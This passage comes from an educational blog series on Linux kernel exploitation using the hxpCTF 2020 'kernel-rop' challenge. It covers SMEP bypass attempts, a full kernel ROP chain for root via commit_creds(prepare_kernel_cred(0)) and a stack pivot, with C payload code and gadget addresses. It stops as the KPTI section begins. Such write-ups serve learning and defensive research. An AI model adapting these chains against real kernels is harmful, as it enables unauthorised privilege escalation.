title = "Learning Linux Kernel Exploitation - Part 2 - Midas Blog"
description = "The second part of the series about learning Linux kernel exploitation through hxpCTF2020 kernel-rop: Adding SMEP, KPTI and SMAP"
full_description = '''Learning Linux Kernel Exploitation - Part 2 Midas included in pwning 2021-01-28 3747 words 18 minutes Contents Preface Adding SMEP Introduction The attempt to overwrite CR4 Building a complete escalation ROP chain Pivoting the stack Adding KPTI Introduction Tweaking the ROP chain Adding SMAP Conclusion Appendix Learning Linux Kernel Exploitation - Part 1 Learning Linux Kernel Exploitation - Part 3 Preface Welcome to the second part of Learning Linux Kernel Exploitation. In the first part, I have introduced what this series is about, demonstrated how to setup the environment and successfully implemented the simplest kernel exploit technique ret2usr, while explaining each and every steps in the exploitation using the environment provided by hxpCTF 2020 challenge kernel-rop. In this part, what I’m going to do is to gradually adding more mitigation features, namely SMEP, KPTI, and SMAP, one-by-one, explain how they can change our exploit method, then rebuild our exploitation to bypass them in different assumed scenarios. I probably won’t re-explain what I have demonstrated and developed in the first part, so if some contents in this post don’t make sense to you, give the first part a shot, because I might have explained it there. With those in mind, let’s start cracking up the difficulty. Note Use the table of contents on the right to navigate to the section that you are interested in. Adding SMEP Introduction SMEP, abbreviated for Supervisor mode execution protection (SMEP), is a feature which marks all the userland pages in the page table as non-executable when the process is exectuting in kernel-mode. In the kernel, this is enabled by setting the 20th bit of Control Register CR4. On boot, it can be enabled by adding +smep to -cpu, and disabled by adding nosmep to -append. Recall from the last part, where we achieved root privileges using a piece of code that we wrote ourselves, this strategy won’t be viable anymore with SMEP on. The reason is because our piece of code retains in user-space, and as I have explained above, SMEP has already marked the page which contains our code as non-executable when the process is executing in kernel-mode. Recall further back to when most of us learned userland pwn, this is effectively the same as setting NX bit to make the stack non-executable. That is the time when we were introduced to Return-oriented programming (ROP) after learning ret2shellcode. The same concept applies with kernel exploitation, I will now introduce kernel ROP after having introduced ret2usr. Note As I have mentioned in part 1, readers are assumed to have sufficient knowledge about userland exploitation, therefore, I won’t explain what ROP is all over again. You can always look it up in a lot of resources on the Internet since it’s a basic technique. For a wider range of coverage on different exploitation techniques that can be used, I’m gonna assume 2 distinct scenarios, then dive in each of them: The first scenario is exactly the one we are dealing with: we have the ability to write to the kernel stack an (almost) arbitrary amount of data. The second scenario is where I will assume that we can only overwrite up to the return address on the kernel stack, nothing more. This will make exploiting a little bit more complicated. Let’s start by investigating the first scenario. The attempt to overwrite CR4 As I have mentioned above, in the kernel, the 20th bit of Control Register CR4 is responsible for enabling or disabling SMEP. And actually, while executing in kernel-mode, we have the power to modify the content of this register with asm instructions such as mov cr4, rdi. Instruction such as that comes from a function called native_write_cr4(), which overwrites the content of CR4 with its parameter, and it resides in the kernel itself. So my first attempt to bypass SMEP is to ROP into native_write_cr4(value), where value is set to clear the 20th bit of CR4. The same as commit_creds() and prepare_kernel_cred(), we can find the address of that function by reading /proc/kallsyms: cat /proc/kallsyms | grep native_write_cr4 -> ffffffff814443e0 T native_write_cr4 Important Note For all the exploitation that I will introduce in this post, I will only explain the parts that are different from ret2usr. The parts that are exactly the same as the previous post are: saving the state, opening the device, and leaking stack cookie. The way we build a ROP chain in the kernel is exactly the same as in userland. So here, instead of immediately return into our userland code, we will return into native_write_cr4(value), then return to our privileges escalation code. For the current value of CR4, we can get it by either causing a kernel panic and it will be dumped out (or attaching a debugger to the kernel) [ 3.794861] CR2: 0000000000401fd9 CR3: 000000000657c000 CR4: 00000000001006f0 We will clear the 20th bit, which is at the position of 0x100000, our value will be 0x6f0. Our payload will be as follow: unsigned long pop_rdi_ret = 0xffffffff81006370; unsigned long native_write_cr4 = 0xffffffff814443e0; void overflow(void){ unsigned n = 50; unsigned long payload[n]; unsigned off = 16; payload[off++] = cookie; payload[off++] = 0x0; // rbx payload[off++] = 0x0; // r12 payload[off++] = 0x0; // rbp payload[off++] = pop_rdi_ret; // return address payload[off++] = 0x6f0; payload[off++] = native_write_cr4; // native_write_cr4(0x6f0), effectively clear the 20th bit payload[off++] = (unsigned long)escalate_privs; puts("[*] Prepared payload"); ssize_t w = write(global_fd, payload, sizeof(payload)); puts("[!] Should never be reached"); } For gadgets such as pop rdi ; ret, we can easily find them by grepping the gadgets.txt file that was generated by running ROPgadget on the kernel image in the first post. Warning It seems that in the kernel image file vmlinux, there is no information about whether a region is executable or not, so ROPgadget will attempt to find all the gadgets that exist in the binary, even the non-executable ones. If you try to use a gadget and the kernel crashes because it is non-executable, you just have to try another one. In theory, running this should give us a root shell. However, in reality, the kernel still crashes, and even more confusing, the reason for the crash is SMEP: [ 3.770954] unable to execute userspace code (SMEP?) (uid: 1000) Why is SMEP still active if we have already cleared the 20th bit? I decided to use dmesg to find out if there is anything weird happens to CR4, and I found this line: [ 3.767510] pinned CR4 bits changed: 0x100000!? It seems like the 20th bit of CR4 is somehow pinned. I then proceeded to google for the source code of native_write_cr4() and other resources to clarify the situation, here is the source code: void native_write_cr4(unsigned long val) { unsigned long bits_changed = 0; set_register: asm volatile("mov %0,%%cr4": "+r" (val) : : "memory"); if (static_branch_likely(&cr_pinning)) { if (unlikely((val & cr4_pinned_mask) != cr4_pinned_bits)) { bits_changed = (val & cr4_pinned_mask) ^ cr4_pinned_bits; val = (val & ~cr4_pinned_mask) | cr4_pinned_bits; goto set_register; } /* Warn after we've corrected the changed bits. */ WARN_ONCE(bits_changed, "pinned CR4 bits changed: 0x%lx!?\n", bits_changed); } } And there is also a documentation on CR4 bits pinning. Reading the mentioned resources, it is clear that in newer kernel versions, the 20th and 21st bits of CR4 are pinned on boot, and will immediately be set again after being cleared, so they can never be overwritten this way anymore! So my first attempt was a fail. At least we now know that even though we have the power to overwrite CR4 in kernel-mode, the kernel developers have already awared of it and prohibited us from using such thing to exploit the kernel. Let’s move on to develop a stronger exploitation that will actually work. Building a complete escalation ROP chain In this second attempt, we will get rid of the idea of getting root privileges by running our own code completely, and try to achieve it by using ROP only. The plan is straightforward: ROP into prepare_kernel_cred(0). ROP into commit_creds(), with the return value from step 1 as parameter. ROP into swapgs ; ret. ROP into iretq with the stack setup as RIP|CS|RFLAGS|SP|SS. The ROP chain itself is not complicated at all, but there are still some hiccups in building it. Firstly, as I mentioned above, there are a lot of gadgets that ROPgadget found but are unusable. Therefore, I had to do a lot of trials-and-errors and finally ended up using these gadgets to move the return value in step 1 (stored in rax) into rdi to pass to commit_creds(), they might seem a bit bizarre, but all of the ordinary gadgets that I tried are non-executable: unsigned long pop_rdx_ret = 0xffffffff81007616; // pop rdx ; ret unsigned long cmp_rdx_jne_pop2_ret = 0xffffffff81964cc4; // cmp rdx, 8 ; jne 0xffffffff81964cbb ; pop rbx ; pop rbp ; ret unsigned long mov_rdi_rax_jne_pop2_ret = 0xffffffff8166fea3; // mov rdi, rax ; jne 0xffffffff8166fe7a ; pop rbx ; pop rbp ; ret The goal with these 3 gadgets is to move rax into rdi without taking the jne. So I have to pop the value 8 into rdx, then return to a cmp instruction to make the comparison equals, which will make sure that we won’t jump to jne branch: ... payload[off++] = pop_rdx_ret; payload[off++] = 0x8; // rdx <- 8 payload[off++] = cmp_rdx_jne_pop2_ret; // make sure JNE doesn't branch payload[off++] = 0x0; // dummy rbx payload[off++] = 0x0; // dummy rbp payload[off++] = mov_rdi_rax_jne_pop2_ret; // rdi <- rax payload[off++] = 0x0; // dummy rbx payload[off++] = 0x0; // dummy rbp payload[off++] = commit_creds; // commit_creds(prepare_kernel_cred(0)) ... Secondly, it seems that ROPgadget can find swapgs just fine, but it can’t find iretq, so I have to use objdump to look for it: objdump -j .text -d ~/vmlinux | grep iretq | head -1 -> ffffffff8100c0d9: 48 cf iretq With the gadgets in hand, we can build the full ROP chain: unsigned long user_rip = (unsigned long)get_shell; unsigned long pop_rdi_ret = 0xffffffff81006370; unsigned long pop_rdx_ret = 0xffffffff81007616; // pop rdx ; ret unsigned long cmp_rdx_jne_pop2_ret = 0xffffffff81964cc4; // cmp rdx, 8 ; jne 0xffffffff81964cbb ; pop rbx ; pop rbp ; ret unsigned long mov_rdi_rax_jne_pop2_ret = 0xffffffff8166fea3; // mov rdi, rax ; jne 0xffffffff8166fe7a ; pop rbx ; pop rbp ; ret unsigned long commit_creds = 0xffffffff814c6410; unsigned long prepare_kernel_cred = 0xffffffff814c67f0; unsigned long swapgs_pop1_ret = 0xffffffff8100a55f; // swapgs ; pop rbp ; ret unsigned long iretq = 0xffffffff8100c0d9; void overflow(void){ unsigned n = 50; unsigned long payload[n]; unsigned off = 16; payload[off++] = cookie; payload[off++] = 0x0; // rbx payload[off++] = 0x0; // r12 payload[off++] = 0x0; // rbp payload[off++] = pop_rdi_ret; // return address payload[off++] = 0x0; // rdi <- 0 payload[off++] = prepare_kernel_cred; // prepare_kernel_cred(0) payload[off++] = pop_rdx_ret; payload[off++] = 0x8; // rdx <- 8 payload[off++] = cmp_rdx_jne_pop2_ret; // make sure JNE doesn't branch payload[off++] = 0x0; // dummy rbx payload[off++] = 0x0; // dummy rbp payload[off++] = mov_rdi_rax_jne_pop2_ret; // rdi <- rax payload[off++] = 0x0; // dummy rbx payload[off++] = 0x0; // dummy rbp payload[off++] = commit_creds; // commit_creds(prepare_kernel_cred(0)) payload[off++] = swapgs_pop1_ret; // swapgs payload[off++] = 0x0; // dummy rbp payload[off++] = iretq; // iretq frame payload[off++] = user_rip; payload[off++] = user_cs; payload[off++] = user_rflags; payload[off++] = user_sp; payload[off++] = user_ss; puts("[*] Prepared payload"); ssize_t w = write(global_fd, payload, sizeof(payload)); puts("[!] Should never be reached"); } And with that, we have successfully built an exploitation that bypasses SMEP and opens a root shell in the first scenario. Let’s move on to see what difficulty we might face in the second one. Pivoting the stack It is clear that we cannot fit the whole ROP chain in the stack anymore with the assumption that we can only overflow up to the return address. To overcome that, we will again use a technique that is also quite popular in userland pwn: stack pivot. It is a technique which involves modifying rsp to point into a controlled writable address, effectively creating a fake stack. However, while pivoting the stack in userland often involves overwriting the saved RBP of a function, then return from it, pivoting in the kernel is much simpler. Because we have such a huge amount of gadgets in the kernel image, we can look for those which modify rsp/esp itself. We are most interested in gadgets that move a constant value into esp, just make sure that the gadget is executable, and the constant value is properly aligned. This is the gadget that I ended up using: unsigned long mov_esp_pop2_ret = 0xffffffff8196f56a; // mov esp, 0x5b000000 ; pop r12 ; pop rbp ; ret Note Many readers have asked me that why does the mov esp gadget work, even though in kernel space, the higher 4 bytes of rsp is not 0 and esp only affects the lower 4 bytes. The answer to this is documented in the documentation of Intel x86 here. TL;DR: by design, a mov instruction that has a 32-bit register as the destination in x86-64 actually zeroes the upper 32 bits of the whole 64-bit register. So that’s what we will overwrite the return address with, but before that, we have to setup our fake stack first. Since esp will become 0x5b000000 after that, we will map a fixed page there, then start writing our ROP chain into it: void build_fake_stack(void){ fake_stack = mmap((void *)0x5b000000 - 0x1000, 0x2000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, -1, 0); unsigned off = 0x1000 / 8; fake_stack[0] = 0xdead; // put something in the first page to prevent fault fake_stack[off++] = 0x0; // dummy r12 fake_stack[off++] = 0x0; // dummy rbp fake_stack[off++] = pop_rdi_ret; ... // the rest of the chain is the same as the last payload } There are 2 things that should be noticed in the above code: I mmapped the pages at 0x5b000000 - 0x1000 instead of exactly 0x5b000000. This is because functions like prepare_kernel_cred() and commit_creds() make calls to other functions inside them, causing the stack to grow. If we point our esp at the exact start of the page, there will not be enough space for the stack to grow and it will crash. I must write a dummy value into the first page, otherwise it will create a Double Fault. According to my understanding, the reason being the pages are only inserted to the page table after being accessed, not after being mapped. We mapped 0x2000 bytes which equal to 2 pages, and we put our ROP chain entirely in the second page, so we have to access the first page as well. And that is how we get a root shell while only being able to overflow the stack up to the return address. It also concludes my introduction to bypassing SMEP, let’s now add one more mitigation, namely KPTI. Adding KPTI Introduction KPTI, a'''
